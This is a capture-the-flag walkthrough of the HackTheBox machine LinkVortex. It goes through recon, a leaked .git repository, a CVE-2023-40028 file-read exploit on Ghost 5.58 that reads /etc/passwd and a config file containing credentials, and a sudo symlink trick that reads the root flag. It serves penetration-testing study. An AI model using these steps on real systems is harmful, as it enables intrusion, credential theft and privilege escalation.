---
tags:
  - HTB
  - Boot2Root
  - Hacking
  - Linux
  - Ghost
---
# Overview

| Name        | LinkVortex |
| ----------- | ---------- |
| OS          | Linux      |
| Base Points | Easy [20]  |
| Status      | Done       |

---
# Recon

## Nmap

```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-16 13:10 EST  
Nmap scan report for linkvortex.htb (10.10.11.47)  
Host is up (0.20s latency).  
Not shown: 998 closed tcp ports (reset)  
PORT STATE SERVICE VERSION  
22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:  
| 256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA)  
|_ 256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519)  
80/tcp open http Apache httpd  
|_http-generator: Ghost 5.58  
|_http-title: BitByBit Hardware  
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
```
## Dirsearch

```bash
dirsearch -u http://linkvortex.htb/  
[13:20:46] 301 - 179B - /assets -> /assets/  
[13:20:47] 301 - 0B - /axis//happyaxis.jsp -> /axis/happyaxis.jsp/  
[13:20:47] 301 - 0B - /axis2-web//HappyAxis.jsp -> /axis2-web/HappyAxis.jsp/  
[13:20:47] 301 - 0B - /axis2//axis2-web/HappyAxis.jsp -> /axis2/axis2-web/HappyAxis.jsp/  
[13:20:53] 301 - 0B - /Citrix//AccessPlatform/auth/clientscripts/cookies.js -> /Citrix/AccessPlatform/auth/clientscripts/cookies.js/  
[13:21:04] 301 - 0B - /engine/classes/swfupload//swfupload_f9.swf -> /engine/classes/swfupload/swfupload_f9.swf/  
[13:21:04] 301 - 0B - /engine/classes/swfupload//swfupload.swf -> /engine/classes/swfupload/swfupload.swf/  
[13:21:06] 301 - 0B - /extjs/resources//charts.swf -> /extjs/resources/charts.swf/  
[13:21:06] 200 - 15KB - /favicon.ico  
[13:21:12] 301 - 0B - /html/js/misc/swfupload//swfupload.swf -> /html/js/misc/swfupload/swfupload.swf/  
[13:21:20] 200 - 1KB - /LICENSE  
[13:21:46] 200 - 103B - /robots.txt  
[13:21:48] 403 - 199B - /server-status  
[13:21:48] 403 - 199B - /server-status/  
[13:21:52] 200 - 254B - /sitemap.xml
```

- Noticed `/robots.txt`

```bash
http://linkvortex.htb/robots.txt
```

- Redirects to `admin` login page but no credentials. 
## Subdomain Enumeration

```bash
  
ffuf -u http://linkvortex.htb/ -w /home/kali/Downloads/SecLists-master/Discovery/Web-Content/big.txt -H "Host:FUZZ.linkvortex.htb" -mc 200 (Subdomain enumeration)  
dev [Status: 200, Size: 2538, Words: 670, Lines: 116, Duration: 237ms]
```

- Nothing is in there.
## Directory Enumeration In `.dev`

```bash
dirsearch -u dev.linkvortex.htb -t 50 -i 200  
[12:10:06] 200 - 73B - /.git/description  
[12:10:06] 200 - 620B - /.git/hooks/  
[12:10:06] 200 - 557B - /.git/  
[12:10:06] 200 - 201B - /.git/config  
[12:10:06] 200 - 41B - /.git/HEAD  
[12:10:06] 200 - 402B - /.git/info/  
[12:10:06] 200 - 240B - /.git/info/exclude  
[12:10:06] 200 - 401B - /.git/logs/  
[12:10:06] 200 - 175B - /.git/logs/HEAD  
[12:10:06] 200 - 418B - /.git/objects/  
[12:10:06] 200 - 147B - /.git/packed-refs  
[12:10:06] 200 - 393B - /.git/refs/  
[12:10:11] 200 - 691KB - /.git/index
```

- It seems like there is a Git leak, use [GitHack](https://github.com/lijiejie/GitHack) tools to pull it down.

```bash
python GitHack.py -u "http://dev.linkvortex.htb/.git/"
```

- Go to `/GitHack/dev.linkvortex.htb/ghost/core/test/regression/api/admin`  
- Read the file `authentication.test.js`
- Found some credentials.

```bash
USERNAME - admin@linkvortex.htb  
PASSWORD - OctopiFociPilfer45
```

- Also found `Dockerfile.ghost` in `/GitHack/dev.linkvortex.htb`.
- Use the credentials to login [Here](http://linkvortex.htb/ghost/#/signin) (we found earlier).

# Exploitation

- Now, if you remember from the Wappalyzer extension, we learned that the site is using Ghost v5.58.
- Found the [exploit](https://github.com/0xyassine/CVE-2023-40028?source=post_page-----5082f90b9507---------------------------------------) for Ghost v5.58.
## CVE-2023-40028

- Change `URL` to `http://linkvortex.htb` on Line `14`.

- Run the exploit.

```bash
./CVE-2023-40028.sh -u admin@linkvortex.htb -p OctopiFociPilfer45
```

- Its only for getting cred for ssh.

```bash
./CVE-2023-40028.sh -u admin@linkvortex.htb -p OctopiFociPilfer45  
WELCOME TO THE CVE-2023-40028 SHELL  
file> /etc/passwd  
root:x:0:0:root:/root:/bin/bash  
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin  
bin:x:2:2:bin:/bin:/usr/sbin/nologin  
sys:x:3:3:sys:/dev:/usr/sbin/nologin  
sync:x:4:65534:sync:/bin:/bin/sync  
games:x:5:60:games:/usr/games:/usr/sbin/nologin  
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin  
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin  
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin  
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin  
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin  
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin  
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin  
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin  
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin  
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin  
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin  
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin  
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin  
node:x:1000:1000::/home/node:/bin/bash
```

- Now if you remember the interesting findings from `_Dockerfile.ghost_`

```bash
/var/lib/ghost/config.production.json
```

```bash
./CVE-2023-40028.sh -u admin@linkvortex.htb -p OctopiFociPilfer45  
WELCOME TO THE CVE-2023-40028 SHELL  
file> /var/lib/ghost/config.production.json  
{  
  "url": "http://localhost:2368",  
  "server": {  
    "port": 2368,  
    "host": "::"  
  },  
  "mail": {  
    "transport": "Direct"  
  },  
  "logging": {  
    "transports": ["stdout"]  
  },  
  "process": "systemd",  
  "paths": {  
    "contentPath": "/var/lib/ghost/content"  
  },  
  "spam": {  
    "user_login": {  
        "minWait": 1,  
        "maxWait": 604800000,  
        "freeRetries": 5000  
    }  
  },  
  "mail": {  
     "transport": "SMTP",  
     "options": {  
      "service": "Google",  
      "host": "linkvortex.htb",  
      "port": 587,  
      "auth": {  
        "user": "bob@linkvortex.htb",  
        "pass": "fibber-talented-worth"  
        }  
      }  
    }  
}  
file> ^C
```

- We get `SSH` credentials

```bash
        "user": "bob@linkvortex.htb",  
        "pass": "fibber-talented-worth"  
```
## SSH

### User

```bash
╭─[~/Hentai/HTB/link]─[at0m@heker]─[130]─[5526]
╰─[:(] % ssh bob@linkvortex.htb
The authenticity of host 'linkvortex.htb (10.10.11.47)' can't be established.
ED25519 key fingerprint is SHA256:vrkQDvTUj3pAJVT+1luldO6EvxgySHoV6DPCcat0WkI.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'linkvortex.htb' (ED25519) to the list of known hosts.
bob@linkvortex.htb's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.5.0-27-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Fri Mar 14 16:11:33 2025 from 10.10.16.98
bob@linkvortex:~$ ls
hey.txt  hi.txt  hyh.txt  user.txt
bob@linkvortex:~$ cat user.txt
87a9b456f12e1bb7d8e02fb802aac41f
bob@linkvortex:~$ 
```
# Privilege Escalation

- Check Bob’s permission by `sudo -l`

```bash
bob@linkvortex:~$ sudo -l  
Matching Defaults entries for bob on linkvortex:  
    env_reset, mail_badpass,  
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,  
    use_pty, env_keep+=CHECK_CONTENT  
  
User bob may run the following commands on linkvortex:  
    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png

```

- Bob may not be the high-privileged user, but he can still execute these commands. So, let’s see what is inside that file:

```
bob@linkvortex:~$ cat /opt/ghost/clean_symlink.sh  
#!/bin/bash  
  
QUAR_DIR="/var/quarantined"  
  
if [ -z $CHECK_CONTENT ];then  
  CHECK_CONTENT=false  
fi  
  
LINK=$1  
  
if ! [[ "$LINK" =~ \.png$ ]]; then  
  /usr/bin/echo "! First argument must be a png file !"  
  exit 2  
fi  
  
if /usr/bin/sudo /usr/bin/test -L $LINK;then  
  LINK_NAME=$(/usr/bin/basename $LINK)  
  LINK_TARGET=$(/usr/bin/readlink $LINK)  
  if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)';then  
    /usr/bin/echo "! Trying to read critical files, removing link [ $LINK ] !"  
    /usr/bin/unlink $LINK  
  else  
    /usr/bin/echo "Link found [ $LINK ] , moving it to quarantine"  
    /usr/bin/mv $LINK $QUAR_DIR/  
    if $CHECK_CONTENT;then  
      /usr/bin/echo "Content:"  
      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null  
    fi  
  fi  
fi
```


- If the file name suffix is `.png` And the file is a symbol link. And the target path Not included `etc` or `root`.
- Then create a symbol link to the `root.txt`. 
- Since the script will check the parameters, a second link can be used to bypass, and at the same time `CHECK_CONTENT` Set to true.

### Root

```bash
bob@linkvortex:~$ ln -s /root/root.txt hyh.txt  
bob@linkvortex:~$ ln -s /home/bob/hyh.txt hyh.png  
bob@linkvortex:~$ sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh /home/bob/hyh.png  
Link found [ /home/bob/hyh.png ] , moving it to quarantine  
Content:  
608398432f83136e59369981d******e
```

---
